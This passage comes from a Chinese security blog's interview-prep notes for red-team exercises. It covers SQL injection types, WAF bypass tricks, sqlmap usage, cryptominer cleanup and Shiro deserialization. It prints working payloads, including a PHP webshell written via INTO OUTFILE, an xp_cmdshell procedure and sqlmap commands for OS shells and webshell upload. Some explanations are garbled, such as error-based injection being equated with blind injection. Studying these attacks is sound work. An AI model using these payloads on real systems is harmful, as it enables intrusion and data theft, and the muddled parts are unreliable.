权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。</p><h2 id="二、应急响应的流程"><a href="#二、应急响应的流程" class="headerlink" title="二、应急响应的流程"></a>二、应急响应的流程</h2><p>1.准备阶段：<br>准备阶段要做的是主要是明确资产范围对可能产生安全问题的 地方进行加固。<br>2.检测阶段：<br>通过日常的监控，收集系统信息日志等手段对可疑的迹象进行分析，判断，如果判定他属于网络安全应急响应时间，则对该事件进行上报（可以利用netstat -ano查看端口连接情况，也可以使用tasklist | find “PID” 对具体进程定位。系统日志可以WIN+R，输入eventvw.msc,直接进入事件查看器分析日志）<br>3.抑制阶段：<br>分析影响范围，根据预案采取相应手段，限制攻击的范围，设置隔离区 ，把影响降低到最小（可以使用安全软件进行隔离，如果整台电脑完全沦陷，也可以考虑首先断网）<br>4.根除阶段：<br>分析产生安全事件的原因，如果是木马，，病毒就需要找出源头来并且遏制，如果是入侵行为就可以通过入侵检测的方式来检测数据流，也可以利用一些工具对病毒特征进行扫描分析和定位<br>5.恢复阶段：<br>对受到破坏的系统和信息进行恢复还原，从可信任的备份中恢复还原系统配置，数据库等等，并对其进行实时监控，确保无误的情况可适当去掉之前做的隔离等抑制等措施。<br>6.总结阶段：<br>对我们上面所发生的安全事件做一个总结，对你所使用到的有效的手段和方法做一个记录，对后面可能遇到的安全事件做一个示例。</p>]]></content>
      
      
      <categories>
          
          <category> HW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>彪的HW面经</title>
      <link href="/du-yu/interview-3.html"/>
      <url>/du-yu/interview-3.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、TOP10"><a href="#一、TOP10" class="headerlink" title="一、TOP10"></a>一、TOP10</h2><pre class="line-numbers language-none"><code class="language-none">1.SQL注入2.失效的身份认证和会话管理3.跨站脚本攻击XSS4.直接引用不安全的对象5.安全配置错误6.敏感信息泄露7.缺少功能级的访问控制8.跨站请求伪造CSRF9.实验含有已知漏洞的组件10.未验证的重定向和转发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一、sql注入"><a href="#一、sql注入" class="headerlink" title="一、sql注入"></a>一、sql注入</h2><p>sql注入的<strong>原理</strong>：<strong>利用应用程序没有正确过滤或转义用户输入的数据</strong>，<strong>导致恶意用户可以在 应用的查询语句中插入自己的SQL代码并传递</strong></p><p><strong>给后台SQL服务器时加以解析并执行</strong>。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。</p><pre class="line-numbers language-none"><code class="language-none">把用户输入的数据当作代码执行。 包含两个关键条件： 一：用户能够控制输入；二：原本程序要执行的代码，拼接了用户输入的数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>例如，如果一个应用程序允许用户在登录时输入用户名和密码，但没有正确地过滤输入的数据，那么攻击者可以尝试在用户名或密码字段中输入SQL查询的一部分，从而绕过身份验证，甚至执行任意的数据库操作。</p><p>因此，要防止SQL注入攻击，应用程序需要对所有用户输入进行严格的验证和处理，以确保任何输入的数据都被正确地过滤、转义或编码，从而避免可能导致注入攻击的特殊字符或语句被传递到数据库服务器。</p><h3 id="sql的类型有什么："><a href="#sql的类型有什么：" class="headerlink" title="sql的类型有什么："></a><strong>sql的类型有什么</strong>：</h3><p>常见（联合查询，布尔，延时，报错），其他（宽字节，堆叠，等等）</p><pre class="line-numbers language-none"><code class="language-none">数字型、字符型、GRT 注入、POST 注入、cookie 注入、布尔盲注、时间盲注、延时注入、编码注入、联合查询注入、堆查询注入等- 根据数据的传输方式  - GET 类型  - POST 类型  - COOKIE 类型- 根据数据的类型  - 数字型  - 字符型- 根据注入的模式  - 基于联合查询的注入模式  - 基于报错的注入模式  - 基于布尔的盲注  - 基于时间的盲注  - 基于查询的注入模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sql注入宽字节的原理："><a href="#sql注入宽字节的原理：" class="headerlink" title="sql注入宽字节的原理："></a><strong>sql注入宽字节的原理：</strong></h3><p>目标站点对于特殊字符的转义（单双引号）前面会添加斜杠/，斜杠/ url 编码是 %5c，如果目标站点使用的是 gbk 编码，则可以构造 payload %df 加 单引号，%df 与%5c 进行结合成为一个汉字，而单引号则逃逸了出去。</p><h3 id="sql注入经常出现的地方"><a href="#sql注入经常出现的地方" class="headerlink" title="sql注入经常出现的地方"></a><strong>sql注入经常出现的地方</strong></h3><ul><li><p>内部实现 / 流程的角度</p><p>url 传参、表单 post、Cookie、User-Agent、X-Forwarded-For…</p></li><li><p>业务点</p><p>新闻 / 商品等查询处、用户注册 / 登陆处、修改用户资料时、找回密码处、搜索框…</p></li></ul><p>简言之：一切可以与数据库进行交互的地方。</p><h3 id="SQL-注入的一般步骤"><a href="#SQL-注入的一般步骤" class="headerlink" title="SQL 注入的一般步骤"></a><strong>SQL 注入的一般步骤</strong></h3><ul><li>求闭合字符</li><li>选择注入模式</li><li>爆数据库</li><li>爆表名</li><li>爆列名</li><li>爆字段</li></ul><h3 id="sql类型介绍："><a href="#sql类型介绍：" class="headerlink" title="sql类型介绍："></a><strong>sql类型介绍</strong>：</h3><ol><li>基于错误的注入（Error-Based Injection）：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。</li><li>盲注注入（Blind Injection）：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以<strong>利用时间延迟等机制来判断是否成功注入恶意的SQL语句。</strong></li><li>基于联合查询的注入（Union-Based Injection）：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向<strong>查询结果集中添加用户列表或密码信息。</strong></li><li>基于布尔逻辑的注入（Boolean-Based Injection）：在这种类型的 SQL 注入中，攻击者会构造一个查询，<strong>该查询会返回一个布尔值</strong>，例如真或假。攻击者可以<strong>利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。</strong></li><li>时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过<strong>向查询中添加时间延迟语句来判断查询是否成功执行</strong>。例如，攻击者可以使用 <strong>SLEEP()</strong> 函数来强制查询等待一段时间，在等待期间<strong>观察程序的响应时间来确定注入点是否存在</strong>。</li></ol><p>总之，在实际的 SQL 注入攻击中，攻击者通常会结合多种技术和手段，以达到其攻击目的。因此，开发人员需要采取适当的防御措施，例如输入验证、参数化查询、白名单过滤等，来避免 SQL 注入漏洞的出现。</p><h3 id="1、sql注入延时函数sleep禁用怎么办："><a href="#1、sql注入延时函数sleep禁用怎么办：" class="headerlink" title="1、sql注入延时函数sleep禁用怎么办："></a><strong>1、sql注入延时函数sleep禁用怎么办：</strong></h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175502879.png" alt="image-20230731175502879"></p><h3 id="2、sql报错注入的函数有哪些："><a href="#2、sql报错注入的函数有哪些：" class="headerlink" title="2、sql报错注入的函数有哪些："></a><strong>2、sql报错注入的函数有哪些：</strong></h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170738154.png" alt="image-20230731170738154"></p><h3 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a><strong>报错注入函数</strong></h3><p>报错注入也被称为盲注入，是一种 SQL 注入技术。在报错注入中，攻击者试图向目标系统发送恶意的 SQL 查询并观察系统返回的错误消息，从而了解数据库中存储的敏感数据或执行其它攻击。</p><p>您提到的“报错注入函数”，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数：</p><ol><li>substring() 函数：该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>length() 函数：该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT LENGTH((SELECT username from users WHERE id=1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>ASCII() 函数：该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>总之，报错注入是一种危险的攻击方式，可以导致泄漏敏感信息、执行未经授权的操作等安全问题。因此，开发人员必须采取适当的安全措施，例如对所有输入数据进行验证和过滤，不要直接拼接 SQL 语句，使用参数化查询等。同时，也应该定期测试应用程序以检测是否存在 SQL 注入漏洞。</p><h3 id="支持报错注入的数据库都有哪些"><a href="#支持报错注入的数据库都有哪些" class="headerlink" title="支持报错注入的数据库都有哪些"></a><strong>支持报错注入的数据库都有哪些</strong></h3><p>报错注入是一种比较常见的 SQL 注入技术，不同的数据库在报错注入方面的支持程度不同。以下是一些主要的数据库和它们在报错注入方面的支持情况：</p><ol><li>MySQL：MySQL 是一个流行的开源关系型数据库管理系统，它对报错注入提供了很好的支持。</li><li>Microsoft SQL Server：Microsoft SQL Server 是微软开发的关系型数据库管理系统，它对报错注入也提供了很好的支持。</li><li>Oracle：Oracle 是一个功能强大的商业级数据库管理系统，它对报错注入的支持相对较差。</li><li>PostgreSQL：PostgreSQL 是一个开源的对象关系型数据库管理系统，它对报错注入的支持相对较好。</li><li>SQLite：SQLite 是一个嵌入式关系型数据库管理系统，它对报错注入的支持较弱。</li></ol><p>总之，在进行 SQL 注入测试时，我们需要针对目标数据库的特定版本和配置进行适当的测试，并注意不同数据库之间在报错注入方面的区别。同时，开发人员在编写应用程序时，应该采取适当的安全措施来防止 SQL 注入攻击。</p><h3 id="3、SQL-注入如何进行检测"><a href="#3、SQL-注入如何进行检测" class="headerlink" title="3、SQL 注入如何进行检测"></a><strong>3、SQL 注入如何进行检测</strong></h3><ol><li>数据库异常日志：在数据库服务器上查看异常日志或错误日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。</li><li>应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。</li><li>漏洞扫描工具：使用专业的漏洞扫描工具，可以自动化地检测应用程序中可能存在的 SQL 注入漏洞，并提供修补建议。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li><li>手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。</li></ol><p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的 SQL 注入检测方法。在进行 SQL 注入检测时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。同时，如果确实发现了 SQL 注入攻击，应及时采取措施来修复漏洞并保护数据库中的数据。</p><h3 id="SQL注入常见的关键字："><a href="#SQL注入常见的关键字：" class="headerlink" title="SQL注入常见的关键字："></a><strong>SQL注入常见的关键字：</strong></h3><ol><li><code>UNION</code>：<code>UNION</code>操作符用于结合两个或更多的<code>SELECT</code>语句的结果集，并移除重复的数据。</li><li><code>OR</code> / <code>AND</code>：这些逻辑操作符可以用于创建更复杂的查询条件。</li><li><code>--</code>、<code>#</code>、<code>/*</code>：这些都是SQL注释符，可以用来结束原始SQL语句，从而使注入的SQL代码生效。</li><li><code>';</code>：这是SQL语句的结束符，也可以用来结束原始SQL语句，从而使注入的SQL代码生效。</li><li><code>'='</code>、<code>'LIKE'</code>：这些操作符可以用于创建查询条件。</li><li><code>' ' or 'x'='x'</code>：这是一个经典的SQL注入例子，如果应用程序没有对用户输入进行适当的处理，那么这个查询条件就会永远为真。</li></ol><h3 id="4、Sql-注入加固措施？"><a href="#4、Sql-注入加固措施？" class="headerlink" title="4、Sql 注入加固措施？"></a><strong>4、Sql 注入加固措施？</strong></h3><p>为了防止 SQL 注入攻击，可以采取以下一些常见的加固措施：</p><ol><li>输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。</li><li>参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。</li><li>最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。</li><li>安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式，而是采用参数化查询等安全方式来操作数据库。</li><li>异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li></ol><p>需要注意的是，以上只是其中一部分常见的 SQL 注入加固措施，针对不同的应用和场景，可能需要采用不同的加固措施。在进行 SQL 注入防御时，需要综合考虑多种因素，并不断更新和完善自身的防御措施，以提高安全水平并减少被攻击的风险。</p><h3 id="sql注入怎么修复"><a href="#sql注入怎么修复" class="headerlink" title="sql注入怎么修复"></a><strong>sql注入怎么修复</strong></h3><p>修复SQL注入漏洞的主要方法之一是使用<strong>参数化查询</strong>。这种技术可以将用户输入作为参数传递给数据库查询，而不是将其拼接到查询字符串中。通过这种方式，应用程序可以避免恶意用户在输入中注入任何SQL代码。</p><p>另一个修复SQL注入漏洞的方法是<strong>对输入数据进行严格的验证和过滤</strong>。这需要开发人员仔细检查所有用户输入数据，并确保它们只包含有效的字符和格式。例如，如果一个输入字段只接受数字，则必须验证输入是否仅包含数字，并拒绝包含其他字符的输入。</p><p>最后，还可以使用安全的编程实践来保护应用程序免受SQL注入攻击。这包括限制应用程序的权限以及使用加密和身份验证等安全措施来保护数据库服务器和应用程序。</p><p>总之，修复SQL注入漏洞的关键是开发人员需要了解并理解如何处理用户输入，并采取必要的措施来确保输入数据的完整性和安全性。</p><h3 id="sql注入遇到waf，怎么绕过"><a href="#sql注入遇到waf，怎么绕过" class="headerlink" title="sql注入遇到waf，怎么绕过"></a><strong>sql注入遇到waf，怎么绕过</strong></h3><p>以下是几种常见的方法：</p><ol><li>使用编码：攻击者可以对注入负载进行编码，例如使用十六进制或Unicode编码等方式，以绕过<strong>WAF对字符集的检查</strong>。攻击者还可以使用<strong>字符串分割、大小写转换等技术手段，以使WAF无法识别恶意代码。</strong></li><li><strong>使用注入器：SQL注入攻击工具如Sqlmap、Havij、SQLi-hunter等，可以</strong>自动检测和利用各种SQL注入漏洞，并通过绕过WAF来获取敏感数据。</li><li>盲注：在盲注攻击中，攻击者不直接获取查询结果，而是根据应用程序的响应来判断是否存在漏洞。攻击者可以<strong>使用时间延迟或错误信息来判断是否存在漏洞，并以此来推断数据库中的数据。</strong></li><li>变形注入：变形注入攻击是一种多次执行的注入攻击，使用变体的注入负载，使注入负载不同于以前的攻击负载，从而逃避WAF的检测。</li></ol><pre class="line-numbers language-none"><code class="language-none">1，关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct2，通杀的，内联注释，如 /*!select*/3，编码，可两次编码4，multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF5，参数绕过，复制参数，id=1&amp;id=16，组合法 如 and 可以用&amp;&amp;再 URL 编码7、替换法，如 and 改成&amp;&amp;;=可以用 like 或 in 等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SQL-注入读写文件的根本条件"><a href="#SQL-注入读写文件的根本条件" class="headerlink" title="SQL 注入读写文件的根本条件"></a>SQL 注入读写文件的根本条件</h3><p>数据库允许导入导出（secure_file_priv）</p><p>当前用户用户文件操作权限（File_priv）</p><table><thead><tr><th>secure_file_prive  参数的设置</th><th>含义</th></tr></thead><tbody><tr><td>secure_file_prive=null</td><td>限制 mysqld 不允许导入导出</td></tr><tr><td>secure_file_priv=/tmp/</td><td>限制 mysqld 的导入导出只能发 生在 /tmp/ 目录下</td></tr><tr><td>secure_file_priv=’ ‘</td><td>不对 mysqld 的导入导出做限制</td></tr></tbody></table><p>secure_file_prive 直接在 my.ini 文件里设置即可</p><ul><li>load_file () 读文件</li></ul><p>into outfile /into dumpfile 写文件</p><p>条件： </p><ul><li>对 web 目录具有读写权限 </li><li>知道文件绝对路径 </li><li>能够使用联合查询（sql 注入时）</li></ul><p>outfile 与 dumpfile 的区别：</p><ul><li>dumpfile 适用于二进制文件，它会将目标文件 写入同一行内，outfile 则更适用于文本文件。</li></ul><p>命令：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">select load_file(‘d:/phpstudy/www/123.php’); select ‘123’ into outfile ‘d:/phpstudy/www/123.php’; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7、sql注入如何写shell"><a href="#7、sql注入如何写shell" class="headerlink" title="7、sql注入如何写shell"></a><strong>7、sql注入如何写shell</strong></h3><p><strong>root权限，网络路径：</strong></p><p>在SQL注入攻击中，如果攻击者成功地注入了一些恶意的SQL代码，则可以利用这些漏洞来执行各种操作，包括编写shell。以下是攻击者可能使用的几种技术：</p><ol><li>利用UNION SELECT语句：通过构造一个带有UNION SELECT语句的SQL查询，攻击者可以在结果集中插入一些命令，并通过这些命令来编写shell，例如在 <strong>MySQL</strong> 中可以使用 <strong>INTO OUTFILE</strong> 来将结果输出到文件中。</li></ol><p>例如，以下语句可以在MySQL中编写shell：</p><pre class="line-numbers language-none"><code class="language-none">http://example.com/products.php?id=1 UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;",2 INTO OUTFILE "/var/www/html/shell.php";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>利用<strong>LOAD_FILE</strong>函数：如果应用程序允许使用LOAD_FILE函数加载文件，攻击者可以使用该函数来读取并执行任意的本地shell脚本文件。</li></ol><p>例如，在MySQL中，攻击者可以使用以下代码来读取并执行一个本地shell脚本：</p><pre class="line-numbers language-none"><code class="language-none">http://example.com/products.php?id=-1' UNION SELECT LOAD_FILE('/path/to/malicious/script.sh'),'',''<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>利用指定数据库的存储过程：攻击者可以使用存储过程来创建和执行恶意的shell脚本，例如在Microsoft SQL Server中，可以使用以下代码来创建并执行一个命令解释器：</li></ol><pre class="line-numbers language-none"><code class="language-none">CREATE PROCEDURE sp_ExecCmd (@cmd varchar(1000))ASBEGINDECLARE @ret intEXEC @ret = master..xp_cmdshell @cmdENDGOEXEC sp_ExecCmd 'command'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击者利用SQL注入漏洞来执行命令或编写shell是非常危险的，因此，在编写应用程序时必须采用适当的安全措施，例如对所有输入数据进行严格的验证和过滤，并使用参数化查询来避免SQL注入攻击。</p><h3 id="8、sqlmap中risk和levels区别"><a href="#8、sqlmap中risk和levels区别" class="headerlink" title="8、sqlmap中risk和levels区别"></a><strong>8、sqlmap中risk和levels区别</strong></h3><p>在SQL注入扫描器sqlmap中，-r 参数表示风险等级，-level 参数表示扫描等级。这两个参数的区别如下：</p><ol><li>风险等级（-r 或 –risk）：表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。</li><li>扫描等级（-level 或 –level）：表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。</li></ol><p>总之，在使用 sqlmap 进行 SQL 注入扫描时，我们需要根据情况调整风险等级和扫描等级，以达到最优的扫描效果。同时，还需要注意 sqlmap 执行测试过程中对目标系统造成的影响，避免对目标系统产生不必要的影响。</p><h3 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a><strong>sqlmap常用命令</strong></h3><p>SQLMap是一种常用的自动化SQL注入攻击工具，可以对目标网站进行全自动的SQL注入漏洞扫描和利用。以下是一些SQLMap的常用命令：</p><ol><li>基本扫描命令：</li></ol><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --dbs &nbsp; &nbsp; &nbsp; # 获取所有可利用的数据库sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables  # 获取指定数据库中的所有表sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --columns &nbsp; # 获取指定表中的所有列sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename -C columnname --dump &nbsp;  # 获取指定列中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POST请求和Cookie：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/login.php" --data="username=admin&amp;password=1234" --cookie="PHPSESSID=abcd1234" --level=5 --risk=3   # 向登录页面发送POST请求和Cookie，并对网站进行深度扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>手动指定注入点：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --technique=T --random-agent --level=5 --risk=3 --current-db --users --passwords --privileges --threads=10 --batch --skip-waf --tamper=randomcomments -p id   # 指定注入点为id参数，绕过WAF设置，使用随机HTTP头和注入负载进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>高级命令：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --os-shell     # 获取操作系统Shellsqlmap -u "http://target.com/page.php?id=1" --os-pwn       # 获取操作系统级别的访问权限sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/config.php"  # 读取指定文件内容sqlmap -u "http://target.com/page.php?id=1" --file-write="/var/www/shell.php" --file-dest="/var/www/html/" --tamper="apostrophemask.py" --batch   # 向目标服务器写入Web Shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sqlmap-–os-shell-原理了解吗？"><a href="#sqlmap-–os-shell-原理了解吗？" class="headerlink" title="sqlmap –os-shell 原理了解吗？"></a>sqlmap –os-shell 原理了解吗？</h3><p>sqlmap 的–os-shell 在 mysql 数据库中的原理，其实就是往服务器上写入了两个  php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页 url 中通过对 cmd 参数传参执行系统命令。</p><h3 id="SQL-server-CVE"><a href="#SQL-server-CVE" class="headerlink" title="SQL server  - CVE"></a><strong>SQL server  - CVE</strong></h3><p><strong>原理：</strong>当SQL Server错误地处理页面请求时,会触发一个远程代码执行漏洞。成功利用该漏洞的攻击者会在当前用户的上下文中运行任意代码,如果当前用户使用管理用户权限登录,那么攻击者就可以控制受影响的系统。</p><p>SQL Server Reporting Services**(SSRS)<strong>提供了一组本地工具和服务，用于创建、部署和管理移动报告和分页报告。</strong>SSRS** Web应用程序中的功能允许低特权用户帐户通过利用反序列化问题在服务器上运行代码。只有授权用户才能访问该应用程序，但是最低权限也可利用此漏洞。</p><p>获得低权限的攻击者向受影响版本的SQL Server的Reporting Services实例发送精心构造的请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码</p><p><strong>3.2 防护建议</strong></p><p>由于攻击者可通过对请求数据包编码绕过Web应用防火墙的防护，强烈建议用户安装补丁程序进行修复。禁止匿名访问，确保只有经过身份验证的用户才能访问相关应用；如果怀疑服务器已经受到威胁，除安装相应补丁外，请及时更改服务器的账户口令，防止被攻击者利用。</p><h2 id="一、木马挖矿特征分析"><a href="#一、木马挖矿特征分析" class="headerlink" title="一、木马挖矿特征分析"></a>一、木马挖矿特征分析</h2><p>当服务器或PC处于什么样的状态时，我们可以判定为被挖矿。通常来说，当我们的服务器或PC资源(CPU)使用率接近或超过100%，并持续高居不下导致服务器或PC操作延缓，我们就可以判定被挖矿。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170128534.png" alt="image-20230731170128534"></p><p>看日志有没有异常的连接或者是网络端口</p><p>看是什么类型，木马的话就看他的可以的端口可疑的进程</p><p>看是什么引起的，能不能手动关掉，不能的话用工具什么的，清除掉再加固。</p><h3 id="一、Linux确认挖矿"><a href="#一、Linux确认挖矿" class="headerlink" title="一、Linux确认挖矿"></a><strong>一、Linux确认挖矿</strong></h3><p>a. 使用<code>top</code>命令查看系统性能，找出消耗资源较高的进程PID；</p><p>b. 根据获取的PID信息利用<code>ps -ef -p PID</code>命令找出系统进程详细信息；</p><p>c. 根据进程详细信息定位到文件位置，进入文件位置进行文件分析，确认是否属于挖矿程序。</p><p>d.crontab查看计划任务</p><p>netstat查看端口</p><p>停止服务：<code>systemctl stop *.service</code>；</p><ul><li>杀掉进程：<code>kill 9 PID</code>，很多时候不光杀掉一个进程；</li><li>删除文件：<code>rm -fr abnormal_file</code>，删除文件时可以使用<code>find / -name abnormal_file</code>查找出系统中所有的恶意文件；</li><li>清理定时任务：<code>crontab -e</code>；</li></ul><h3 id="一、Windows确认挖矿"><a href="#一、Windows确认挖矿" class="headerlink" title="一、Windows确认挖矿"></a><strong>一、Windows确认挖矿</strong></h3><ul><li><p>使用图形化界面分析确认</p><p>a. 打开<code>任务管理器</code>：<code>Ctrl + Alt + Delete</code> 快捷键 或者 <code>win + r</code> 快捷键，输入 <code>taskmgr</code>；</p><p>b. 在<code>任务管理器</code>中找到<code>资源管理器</code>；</p><p>c. 通过<code>资源管理器</code>找到占用CPU资源较高的服务或进程，获取其PID信息；</p><p>d. 利用获取的PID信息在<code>任务管理器</code>中的<code>详细信息</code>一栏中找到对应的程序，右键<code>打开文件位置</code>，获取异常文件目录；</p><p>e. 进入到异常文件目录中，对文件进行分析，确认是否属于挖矿程序；</p><p>f. 确认挖矿程序后，先对挖矿程序进行备份。然后先关闭对应的服务与进程，再删除对应的定时任务，最后删除对应的文件。在删除文件之后，反向再查询一遍定时任务、进程与服务，最好是在间隔一定时间段后再复查一次</p><p>应急响应流程：</p></li></ul><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170501965.png" alt="image-20230731170501965"></p><h2 id="一、java漏洞："><a href="#一、java漏洞：" class="headerlink" title="一、java漏洞："></a>一、java漏洞：</h2><p>shiro，fastjson之类的，常问这俩。</p><h3 id="一、shiro"><a href="#一、shiro" class="headerlink" title="一、shiro"></a>一、shiro</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170615823.png" alt="image-20230731170615823"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173919178.png" alt="image-20230731173919178"></p><h4 id="平常怎么去发现-Shiro-漏洞的？"><a href="#平常怎么去发现-Shiro-漏洞的？" class="headerlink" title="平常怎么去发现 Shiro 漏洞的？"></a><strong>平常怎么去发现 Shiro 漏洞的？</strong></h4><p>Apache Shiro 是一个 Java 安全框架，执行身份验证、授权、密码和会话管理。apacheShiro 框架提供了记住我（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。</p><p>shiro 反序列化漏洞：shiro 在 CookieRememberMeManaer 类中将 cookie 中<strong>rememberMe  字段内容分别进行序列化、AES 加密、Base64 编码操作</strong>。攻击者构造一个恶意的对象，并且<strong>对其序列化，AES 加密，base64 编码后，作为 cookie 的 rememberMe 字段发送。Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</strong></p><p>登陆失败时候会返回 rememberMe=deleteMe 字段或者使用 shiroScan 被动扫描去发现</p><p>完整：</p><p>未登陆的情况下，请求包的 cookie 中没有 rememberMe 字段，返回包 set-Cookie 里也没有 deleteMe 字段</p><p>登陆失败的话，不管勾选 RememberMe 字段没有，返回包都会有 rememberMe=deleteMe 字段</p><p>不勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段。但是之后的所有请求中 Cookie 都不会有 rememberMe 字段</p><p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段</p><h4 id="shiro-有几种漏洞类型"><a href="#shiro-有几种漏洞类型" class="headerlink" title="shiro 有几种漏洞类型"></a><strong>shiro 有几种漏洞类型</strong></h4><p>shiro 550</p><p>shiro 721</p><p>Apache Shiro 框架提供了记住我的功能（RemeberMe），用户登录成功后会生成经过加密并编码的 cookie。cookie 的 key 为  RemeberMe，cookie 的值是经过对相关信息进行序列化，然后使用 aes 加密，最后在使用 base64 编码处理形成的</p><p>在服务端接收 cookie 值时，按以下步骤解析：</p><blockquote><p>检索 RemeberMe cookie 的值</p><p>Base 64 解码</p><p>使用 ACE 